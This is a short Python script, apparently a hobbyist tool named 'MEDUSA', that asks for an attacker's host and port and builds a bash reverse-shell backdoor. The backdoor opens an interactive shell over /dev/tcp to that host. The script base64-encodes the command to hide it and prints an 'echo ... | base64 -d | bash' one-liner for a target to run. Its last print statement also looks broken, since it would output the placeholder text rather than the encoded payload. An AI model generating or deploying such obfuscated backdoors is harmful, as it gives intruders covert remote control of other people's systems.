#!/usr/bin/env python3
#
#AUTHOR: droid7
#VERSION: 1.0.0 [BETA]
#COUNTRY: France
#GITHUB: https://github.com/droid7z
#DISCORD: droid7z_
#
#############
# LIBRARIES #
#############
import os
import time
import base64

MEDUSA_LOGO_BANNER = ("""
 • ▌ ▄ ·. ▄▄▄ .·▄▄▄▄  ▄• ▄▌.▄▄ ·  ▄▄▄· 
 ·██ ▐███▪▀▄.▀·██▪ ██ █▪██▌▐█ ▀. ▐█ ▀█ 
 ▐█ ▌▐▌▐█·▐▀▀▪▄▐█· ▐█▌█▌▐█▌▄▀▀▀█▄▄█▀▀█ 
 ██ ██▌▐█▌▐█▄▄▌██. ██ ▐█▄█▌▐█▄▪▐█▐█ ▪▐▌
 ▀▀  █▪▀▀▀ ▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀  ▀ 

 AUTHOR: droid7
 VERSION: 1.0.0 [BETA]
 COUNTRY: France
 GITHUB: https://github.com/droid7z
 DISCORD: droid7z_
""")

def MEDUSA_CLIENT():

    os.system("clear")
    
    print(MEDUSA_LOGO_BANNER)
    
    LHOST = input(" [LHOST] > ")
    LPORT = input(" [LPORT] > ")
    
    BACKDOOR = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    BACKDOOR_ENCODED_BASE64 = base64.b64encode(BACKDOOR.encode()).decode()
    
    print("[...] Generation of the base64 encoded backdoor in progress...")
    time.sleep(5)
    print(f"[RAW] > " + "echo {BACKDOOR_ENCODED_BASE64} | base64 -d | bash")
    
MEDUSA_CLIENT()
